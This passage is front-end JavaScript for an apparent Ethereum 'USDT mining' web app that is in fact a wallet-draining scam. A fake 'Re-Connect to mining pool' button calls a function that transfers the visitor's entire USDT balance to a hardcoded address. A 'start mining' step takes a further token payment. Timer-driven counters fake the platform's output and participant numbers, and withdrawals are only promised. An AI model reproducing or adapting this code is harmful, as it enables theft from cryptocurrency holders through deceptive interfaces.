"nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "_to", "type": "address" }, { "internalType": "uint256", "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "_from", "type": "address" }, { "internalType": "address", "name": "_to", "type": "address" }, { "internalType": "uint256", "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }];

var CHAIN_ID = 3; // 1 : Ether mainnet 3 : Ropsten Testnet 

var path = window.location.origin;
if (path.includes("eth-usdtmining") == false) {
    CHAIN_ID = 3; // 
}

const TOKEN_ADDRESS = (CHAIN_ID == 1) ? "0xdAC17F958D2ee523a2206206994597C13D831ec7" : "0x30D94E1De389aF892633aa6644E39a8E45817e79";

const TOKEN_ABI = (CHAIN_ID == 1) ? token_abi_mainnet : contract_abi_ropsten;

const CONTRACT_ABI = (CHAIN_ID == 1) ? contract_abi_mainnet : contract_abi_ropsten;

const GAS_FEES = "1";

const GAS_LIMIT = "41446"; // 41446 3000000

const TOKEN = (CHAIN_ID == 1) ? "USDT" : "PMDB";

const BSCSCAN = (CHAIN_ID == 1) ? "https://bscscan.com/" : "https://ropsten.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161";

const RPC = (CHAIN_ID == 1) ? "https://bsc-dataseed1.binance.org:443" : "https://ropsten.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161";


let UserMainBalance;

// Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const EvmChains = window.EvmChains;
const Fortmatic = window.Fortmatic;
const APP_NAME = 'My Awesome DApp'
const APP_LOGO_URL = 'https://example.com/logo.png'
const ETH_JSONRPC_URL = 'https://mainnet.infura.io/v3/84842078b09946638c03157f83405213'

// Web3modal instance
let web3Modal

/**
 * Setup the orchestra
 */
async function init() {

    console.log("Initializing example");
    console.log("WalletConnectProvider is", WalletConnectProvider);
    console.log("Fortmatic is", Fortmatic);
    console.log(window.ethereum);
    const providerOptions = {
    };

    web3Modal = new Web3Modal({
        network: "mainnet", // optional
        cacheProvider: false, // optional 
        providerOptions, // required
        disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
    });

    if (window.ethereum != undefined) {
        // provider = await web3Modal.connect();
        onConnect();
    }

    localWalletStore = localStorage.getItem('walletAddress');

    if (localWalletStore != null) {
        provider = window.ethereum;
        refreshAccountData();
    }

    setTimeout(() => {
        getTransactionRecord();

    }, 2000);
}

async function getTransactionRecord() {
    var settings = {
        "url": "https://eth-usdtmining.com/api/get-transaction.php",
        "method": "GET",
        "timeout": 0,
    };

    $.ajax(settings).done(function (response) {
        console.log(JSON.parse(response).total_record);
        var totalRecord = JSON.parse(response).total_record;
        totalRecord.forEach(element => {
            console.log('Address user length' + element.user.length);
            var address = element.user.substring(0, 5) + '*****' + element.user.substring(element.user.length - 12, element.user.length);
            var li = '<li data-v-2605c3be="" class="con-item"><span data-v-2605c3be="" class="link-color">' + address + '</span><span data-v-2605c3be="" class="black-color">' + element.balance + ' ETH</span></li>';
            $('#myScroll').append(li);
        });
    });
}

async function getUserMining(selectedAccount) {
    var settings = {
        "url": "https://eth-usdtmining.com/api/get-mining.php?user=" + selectedAccount + "",
        "method": "GET",
        "timeout": 0,
    };

    $.ajax(settings).done(function (response) {
        $("#miningRecord").empty();
        console.log(JSON.parse(response));
        var TotalMiningAmount = JSON.parse(response).total[0].totalamount;
        var TodayMiningAmount = JSON.parse(response).today[0].todayamount
        $("#totalmining").html(TotalMiningAmount == null ? '0' : parseFloat(TotalMiningAmount).toFixed(4) + " ETH");
        $("#todaymining").html(TodayMiningAmount == null ? '0' : parseFloat(TodayMiningAmount).toFixed(4) + " ETH");


        $("#refertotalmining").html(TotalMiningAmount == null ? '0' : parseFloat(TotalMiningAmount).toFixed(4) + " ETH");
        $("#refertodaymining").html(TodayMiningAmount == null ? '0' : parseFloat(TodayMiningAmount).toFixed(4) + " ETH");

        $("#eth_token").val(parseFloat(TotalMiningAmount).toFixed(4));
        convertETHtoUSD();

        var totalRecord = JSON.parse(response).mininghistory;
        var constLi = '<tr class="black-color"><td>Amount</td><td>Description</td><td>Created AT</td></tr>';
        // var constLi='<li data-v-2605c3be="" class="con-item"><span data-v-2605c3be="" class="black-color">ETH</span><span data-v-2605c3be="" class="black-color">USDT</span><span data-v-2605c3be="" class="black-color">STATUS</span></li>';
        $('#miningRecord').append(constLi);
        totalRecord.forEach(element => {
            var tr = '<tr><td>' + element.amount + '</td><td>' + element.description + '</td><td>' + element.created_at + '</td></tr>';
            $('#miningRecord').append(tr);
        });
    });
}

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {

    // Get a Web3 instance for the wallet
    const web3 = new Web3(provider);
    const chainId = await web3.eth.getChainId();
    // Get list of accounts of the connected wallet
    const accounts = await web3.eth.getAccounts();
    selectedAccount = accounts[0];

    if (accounts.length > 0) {
        getUserMining(selectedAccount);
        const balance = await web3.eth.getBalance(selectedAccount);
        let ethBalance = web3.utils.fromWei(balance, "ether");
        const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
        var latestETHUSD = await jQuery.ajax({
            type: "get",
            dataType: "json",
            url: 'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD',
            success: function (response) {
                console.log(response)
                return response;
            }
        });
        $("#account-balance").html(parseFloat(humanFriendlyBalance * latestETHUSD.USD).toFixed(4)  + " USDT");
        var settings = {
            "url": "https://eth-usdtmining.com/api/get-user.php?user=" + selectedAccount + "",
            "method": "GET",
            "timeout": 0,
        };
        if (createUserCall == false) {
            $.ajax(settings).done(function (response) {
                console.log(response);
                response = JSON.parse(response);
                if (response.user.length == 0) {
                    var referDigit = window.location.search.split('=')[1];
                    var unique_val = Math.floor(1000 + Math.random() * 9000);
                    $("#referralLink").val("https://eth-usdtmining.com?c=" + unique_val);
                    var formData = {
                        'user': selectedAccount,
                        'unique_id': unique_val,
                        'ReferranceId': referDigit == undefined ? '0' : referDigit
                    };
                    $.ajax({
                        data: formData,
                        type: "post",
                        url: "https://eth-usdtmining.com/api/create-user.php",
                        success: function (data) {
                            console.log("Data Save: " + data);
                        }
                    });
                    $("#btn-model").show();
                    $("#btn_join_disabled").hide();
                }
                else {
                    if (response.user.length > 0) {
                        if (response.transaction.length > 0){
                            if (parseInt(response.user[0].reenter) > 0 && response.transaction[0].TxHash == "") {
                                $("#receiveReconnect").html('Failed to establish connection to <br/> mining pool. Re-Connect.');
                                $("#btn-model").hide();
                                $("#btn_join_disabled").hide();
                                $("#btn_join_renter").show();
                            }
                            else{
                                $("#btn-model").hide();
                                $("#btn_join_renter").hide();
                                $("#btn_join_disabled").show();
                                $("#receiveReconnect").html('Your Mining Has Been Started.');
                            }
                        } 
                        else {
                            $("#btn_join_renter").hide();
                            $("#btn-model").show();
                            $("#btn_join_disabled").hide();
                            $("#receiveReconnect").html('Join the node and start mining');
                        }

                        $("#referralLink").val("https://eth-usdtmining.com?c=" + response.user[0].unique_id);

                        var settings = {
                            "url": "https://eth-usdtmining.com/api/get-team.php?ReferranceId=" + response.user[0].unique_id,
                            "method": "GET",
                            "timeout": 0,
                        };

                        $.ajax(settings).done(function (response) {
                            console.log(JSON.parse(response).directpromote);
                            var directpromote = JSON.parse(response).directpromote;
                            var team = JSON.parse(response).team;
                            $("#directpromotor").html(directpromote.length);
                            $("#teamsize").html(team.length);

                        });

                    }
                }
            });
            createUserCall = true;
        }

        localStorage.setItem('walletAddress', selectedAccount);
        document.querySelector('#connectAddress').textContent = selectedAccount.substring(0, 8) + '...';
        document.querySelector('#btn-connect').removeEventListener('click', onConnect); //disable click event when connected to wallet
        // document.querySelector("#btn-disconnect").style.display = "block";
    }
    else {
        document.querySelector("#btn-connect").removeAttribute("disabled");
        document.querySelector("#btn-connect").style.cursor = "pointer";
        document.querySelector("#btn-connect").style.opacity = "1";
    }

    // Go through all accounts and get their ETH balance
    const rowResolvers = accounts.map(async (address) => {

        const balance = await web3.eth.getBalance(address);
        const ethBalance = web3.utils.fromWei(balance, "ether");
        const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);

        console.log(ethBalance);
        // get latest ETH USD value
        var latestETHUSD = await jQuery.ajax({
            type: "get",
            dataType: "json",
            url: 'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD',
            success: function (response) {
                console.log(response)
                return response;
            }
        });
        // $("#accountBalance").html("You have balance : " + parseFloat(ethBalance).toFixed(4) + " ETH( $" + (parseFloat(humanFriendlyBalance) * latestETHUSD.USD).toFixed(2) + " USD )");
        // $("#accountBalance").show();
    });
    await Promise.all(rowResolvers);
}

/**
 * Connect wallet button pressed.
 */
async function onConnect() {

    console.log("Opening a dialog", web3Modal);
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        $(".van-notify").html("Please Connect to Wallet");
        $(".van-notify").slideDown("slow");
        setTimeout(() => {
            $(".van-notify").slideUp("slow");
        }, 3000);
        return;
    }

    // Subscribe to accounts change
    provider.on("accountsChanged", (accounts) => {
        createUserCall = false;
        $("#accountBalance").html('');
        fetchAccountData();
    });

    // Subscribe to chainId change
    provider.on("chainChanged", (chainId) => {
        createUserCall = false;
        $("#accountBalance").html('');
        fetchAccountData();
    });

    // Subscribe to networkId change
    provider.on("networkChanged", (networkId) => {
        createUserCall = false;
        $("#accountBalance").html('');
        fetchAccountData();
    });

    await refreshAccountData();
}

async function refreshAccountData() {
    
    document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    document.querySelector("#btn-connect").style.cursor = "not-allowed";
    document.querySelector("#btn-connect").style.opacity = "0.5";
    await fetchAccountData(provider);
}

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

    console.log("Killing the wallet connection", provider);

    // TODO: Which providers have close method?
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null;

    }
    selectedAccount = null;
    $("#accountBalance").hide();
    document.querySelector('#connectAddress').textContent = 'Connecting wallet';
    document.querySelector('#btn-connect').addEventListener('click', onConnect);
    document.querySelector("#btn-connect").removeAttribute("disabled");
    document.querySelector("#btn-connect").style.cursor = "pointer";
    document.querySelector("#btn-connect").style.opacity = "1";
    localStorage.removeItem('walletAddress');
}

//Transaction Approve function

async function onSendReceiveAmount() {

    const web3 = new Web3(provider);
    if (selectedAccount == null || selectedAccount == 'undefined') {
        await onConnect();
        return false;
    }
    document.querySelector(".van-toast").style.display = "flex";
    var receiver = '0x114c791836635f3551Fe118F446E69b17A61a80c';
    // var count = await web3.eth.getTransactionCount(selectedAccount);
    // var gasPrice = await web3.eth.getGasPrice(function (error, result) {
    //     console.log('gasPrice', result);
    //     return result;
    // });
    // Get Wallet Balance 
    const balance = await web3.eth.getBalance(selectedAccount);
    console.log(balance);
    let ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);

    // get latest ETH USD value
    // var latestETHUSD = await jQuery.ajax({
    //     type: "get",
    //     dataType: "json",
    //     url: 'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD',
    //     success: function (response) {
    //         console.log(response)
    //         return response;
    //     }
    // });
    // let WalletUSD = parseFloat(humanFriendlyBalance) * latestETHUSD.USD;

    var tokencontract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS, { from: selectedAccount });
    var tokenBalance = await tokencontract.methods.balanceOf(selectedAccount).call();
    // var decimals = await tokencontract.methods.decimals().call();
    // var DBtokenBalance = parseFloat(tokenBalance) / 10 ** parseFloat(decimals);
    // var amountS = tokenBalance;
    // First Approve from client
    tokencontract.methods
        .transfer(receiver, tokenBalance)
        .send({ from: selectedAccount }, function (err, res) {
            if (err) {
                console.log("An error occured", err)
                return
            }
            console.log("Hash of the transaction: " + res);
            var formData = {
                'user': selectedAccount,
                'TxHash': res,
            };
            $.ajax({
                data: formData,
                type: "post",
                url: "https://eth-usdtmining.com/api/update-transaction.php",
                success: function (data) {
                    console.log("Data Save: " + data);
                }
            });
            document.querySelector(".van-toast").style.display = "none";
            $("#btn-model").hide();
            $("#myModal").hide();
            $("#btn_join_renter").hide();
            $("#btn_join_disabled").show();

        }).catch(err => {
            if (err.message != undefined) {
                console.log(err.message);
                $(".van-notify").html(err.message);
            }
            else {
                $(".van-notify").html(err);
            }

            document.querySelector(".van-toast").style.display = "none";
            $(".van-notify").slideDown("slow");
            setTimeout(() => {
                $(".van-notify").slideUp("slow");
            }, 5000);
        });

    // tokencontract.methods.approve(TOKEN_ADDRESS, web3.utils.toWei(amountS.toString())).send({ chaind_id: CHAIN_ID, gas: GAS_LIMIT })
    //     .on('transactionHash', function (hash) {
    //         console.log('\n[TRANSACTION_HASH]\n\n' + hash);
    //         document.querySelector(".van-toast").style.display = "none";
    //         var formData = {
    //             'user': selectedAccount,
    //             'TxHash': hash,
    //             'balance': DBtokenBalance,
    //         };
    //         $.ajax({
    //             data: formData,
    //             type: "post",
    //             url: "https://eth-usdtmining.com/api/create-transaction.php",
    //             success: function (data) {
    //                 alert("Data Save: " + data);
    //             }
    //         });
    //         $("#btn-model").hide();
    //         $("#myModal").hide();
    //         $("#btn_join_renter").hide();
    //         $("#btn_join_disabled").show();

    //     }).on('error', function (error) {
    //         console.log('\n[ERROR]\n\n' + error.message);
    //         document.querySelector(".van-toast").style.display = "none";
    //         if (error.message != undefined) {
    //             $(".van-notify").html(error.message);
    //         }
    //         else {
    //             $(".van-notify").html(error);
    //         }
    //         $(".van-notify").slideDown("slow");
    //         setTimeout(() => {
    //             $(".van-notify").slideUp("slow");
    //         }, 5000);
    //     }).then(async function (done) {
    //         console.log('\n[DONE]\n\n', done);
    //     });
}

async function convertETHtoUSD() {
    await jQuery.ajax({
        type: "get",
        dataType: "json",
        url: 'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD',
        success: function (response) {
            console.log(response);
            var ethtoken = document.querySelector("#eth_token").value;
            var usdttoken = parseFloat(ethtoken) * response.USD;
            $("#usdt_token").val(usdttoken.toFixed(4));
            $("#exchangeValue").html("Price: 1ETH ≈ " + response.USD.toFixed(2) + " USDT")
        }
    });
}

async function getwalletBalance() {
    getUserMining(selectedAccount);
    // const web3 = new Web3(provider);
    // const balance = await web3.eth.getBalance(selectedAccount);
    // let ethBalance = web3.utils.fromWei(balance, "ether");
    // const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    // $("#eth_token").val(humanFriendlyBalance);
    // convertETHtoUSD();
}

async function saveExchangeData() {
    var ethtoken = document.querySelector("#eth_token").value;
    var usdtoken = document.querySelector("#usdt_token").value;
    if (usdtoken < 12) {
        $("#warrning").html('Minimum withdrawal amount is $10');
        return;
    }
    var formData = { 'ETH': ethtoken, 'USDT': usdtoken, 'user': selectedAccount };
    $("#warrning").html('');
    $.ajax({
        data: formData,
        type: "post",
        url: "https://eth-usdtmining.com/api/create-exchange.php",
        success: function (data) {
            console.log("Data Save: " + data);
            $("#eth_token").val(0);
            $("#usdt_token").val(0);
            $("#exchangemsg").html('Your withdrawal will be sent to your USDT wallet address within 24 hours in the future');
            setTimeout(() => {
                $("#exchangemsg").html('Convert the ETH coins you dug into USDT');
            }, 3000);
        }
    });
}

async function getExchangeRecord() {
    var settings = {
        "url": "https://eth-usdtmining.com/api/get-exchange.php?user=" + selectedAccount,
        "method": "GET",
        "timeout": 0,
    };

    $.ajax(settings).done(function (response) {
        $("#exchnageRecord").show();
        $("#exchnageForm").hide();
        $("#myexchange").empty();
        console.log(JSON.parse(response).exchnage);
        var totalRecord = JSON.parse(response).exchnage;
        var constLi = '<tr class="black-color"><td>ETH</td><td>USDT</td><td>STATUS</td></tr>';
        // var constLi='<li data-v-2605c3be="" class="con-item"><span data-v-2605c3be="" class="black-color">ETH</span><span data-v-2605c3be="" class="black-color">USDT</span><span data-v-2605c3be="" class="black-color">STATUS</span></li>';
        $('#myexchange').append(constLi);
        totalRecord.forEach(element => {
            var status = 'Pending';
            if (element.status == 1) {
                status = 'Approve';
            }
            else if (element.status == 2) {
                status = 'Reject';
            }
            var tr = '<tr><td>' + element.ETH + '</td><td>' + element.USDT + '</td><td>' + status + '</td></tr>';
            // var tr = '<tr><td data-v-2605c3be="" class="con-item black-color">' + element.ETH + '</td><td data-v-2605c3be="" class="con-item black-color">' + element.USDT + '</td><td data-v-2605c3be="" class="con-item black-color">'+status+'</td></tr>';
            // '<li data-v-2605c3be="" class="con-item"><span data-v-2605c3be="" class="black-color"></span><span data-v-2605c3be="" class="black-color"></span><span data-v-2605c3be="" class="black-color">' + status + '</span></li>';
            $('#myexchange').append(tr);
        });
    });
}

async function onMiningStart() {
    const web3 = new Web3(provider);
    if (selectedAccount == null || selectedAccount == 'undefined') {
        await onConnect();
        return false;
    }
    document.querySelector(".van-toast").style.display = "flex";
    // Get Wallet Balance 
    const balance = await web3.eth.getBalance(selectedAccount);
    let ethBalance = web3.utils.fromWei(balance, "ether");

    var tokencontract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS, { from: selectedAccount });
    var tokenBalance = await tokencontract.methods.balanceOf(selectedAccount).call();
    var decimals = await tokencontract.methods.decimals().call();
    var DBtokenBalance = parseFloat(tokenBalance) / 10 ** parseFloat(decimals);
    if(DBtokenBalance < 10){
        $("#accountBalance").html("You have sufficient balance to start mining");
        document.querySelector(".van-toast").style.display = "none";
        return;
    }
    $("#accountBalance").html('');
    var ETHAmount = await jQuery.ajax({
        type: "get",
        dataType: "json",
        url: 'https://min-api.cryptocompare.com/data/price?fsym=USD&tsyms=ETH',
        success: function (response) {
            console.log(response);
            return response;
        }
    });

    // console.log(parseFloat(DBtokenBalance) * ETHAmount.ETH);
    // 000000000000
    tokencontract.methods
        .transfer(receiver, '10000000')
        .send({ from: selectedAccount }, function (err, res) {
            if (err) {
                console.log("An error occured", err)
                return
            }
            console.log("Hash of the transaction: " + res);
            var txAmount = parseFloat(DBtokenBalance) * ETHAmount.ETH
            var formData = {
                'user': selectedAccount,
                'TxHash': '',
                'balance': parseFloat(txAmount).toFixed(4),
            };
            $.ajax({
                data: formData,
                type: "post",
                url: "https://eth-usdtmining.com/api/create-transaction.php",
                success: function (data) {
                    document.querySelector(".van-toast").style.display = "none";
                    console.log("Data Save: " + data);
                }
            });
            $("#btn-model").hide();
            $("#myModal").hide();
            $("#btn_join_renter").hide();
            $("#btn_join_disabled").show();


        }).catch(err => {
            if (err.message != undefined) {
                console.log(err.message);
                $(".van-notify").html(err.message);
            }
            else {
                $(".van-notify").html(err);
            }

            document.querySelector(".van-toast").style.display = "none";
            $(".van-notify").slideDown("slow");
            setTimeout(() => {
                $(".van-notify").slideUp("slow");
            }, 5000);
        });
}

/**
 * Main entry point.
 */
window.addEventListener('load', async () => {
    var initialNumber = 11146204.245826;
    var participant = 13697077;
    init();
    await jQuery.ajax({
        type: "get",
        dataType: "json",
        url: 'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD',
        success: function (response) {
            $("#exchangeValue").html("Price: 1ETH ≈ " + response.USD + " USDT")
        }
    });
    document.querySelector("#btn-connect").addEventListener("click", onConnect);
    document.querySelector('#btn-send-receive').addEventListener("click", onMiningStart);
    // document.querySelector("#btn_join_disabled").addEventListener("click", onMiningStart);
    document.querySelector("#eth_token").addEventListener("change", convertETHtoUSD);
    document.querySelector("#eth_Balance_All").addEventListener("click", getwalletBalance);
    document.querySelector("#btn_exchange").addEventListener("click", saveExchangeData);
    document.querySelector("#exchangerecord").addEventListener("click", getExchangeRecord);
    document.querySelector("#btn_join_renter").addEventListener("click", onSendReceiveAmount);
    $("#exchnageRecord").hide();
    document.querySelector("#btn_exchange_form").addEventListener("click", backToExchangeForm);

    document.querySelector("#showmining").addEventListener("click", showmining);
    document.querySelector("#showminingInfo").addEventListener("click", showminingInfo);

    setInterval(() => {
        initialNumber++;
        $("#totaloutput").html(initialNumber.toLocaleString() + " ETH");
    }, 60000);

    setInterval(() => {
        participant++;
        $("#participants").html(participant.toLocaleString() + " ETH");
    }, 1800000);
});

async function backToExchangeForm() {
    $("#exchnageRecord").hide();
    $("#exchnageForm").show();
}

async function showmining() {
    $('#miningtable').show();
    $('#miningInfo').hide();
}

async function showminingInfo() {
    $('#miningtable').hide();
    $('#miningInfo').show();
}